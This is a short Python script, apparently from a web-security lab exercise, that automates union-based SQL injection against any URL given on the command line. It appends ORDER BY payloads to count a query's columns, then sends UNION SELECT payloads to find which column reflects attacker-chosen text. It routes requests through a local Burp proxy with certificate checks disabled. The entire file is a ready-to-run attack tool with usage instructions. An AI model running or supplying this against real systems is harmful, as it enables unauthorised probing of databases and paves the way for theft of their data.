#!/usr/bin/env python3
import requests
import sys

# For debugging with burpsuite
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_col(url, payload):
    for i in range(1,int(payload)):
        sqli = f"'+ORDER+BY+{i}--"
        req = requests.get(url+sqli, verify=False)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

def inject_col(url, string, number):
    for i in range(1,int(number+1)):
        payload_list = ['NULL'] * number # 'NULL','NULL','NULL'
        payload_list[i-1] = string
        sqli = "'UNION SELECT " + ','.join(payload_list) + "--"
        req = requests.get(url+sqli, verify=False, proxies=p)
        if "Internal Server Error" not in req.text:
            return i
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        string = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <payload> <string>".format(sys.argv[0]))
        print('[-] Example: {} http://example.com 10 "\'a\'"'.format(sys.argv[0]))
        sys.exit(1)

    print("[-] Figuring out number of columns...")
    num_col = get_col(url, payload)
    if num_col:
        print("[-] The number of columns is {}...".format(num_col))
        print("[-] Figuring out which column contains text...")
        text_col = inject_col(url, string, num_col)
        if text_col:
            print("[-] Injectable columns are {}...".format(text_col))
        else:
            print("[-] SQLi UNION not successful!")
    else:
        print("[-] SQLi UNION not successful!")
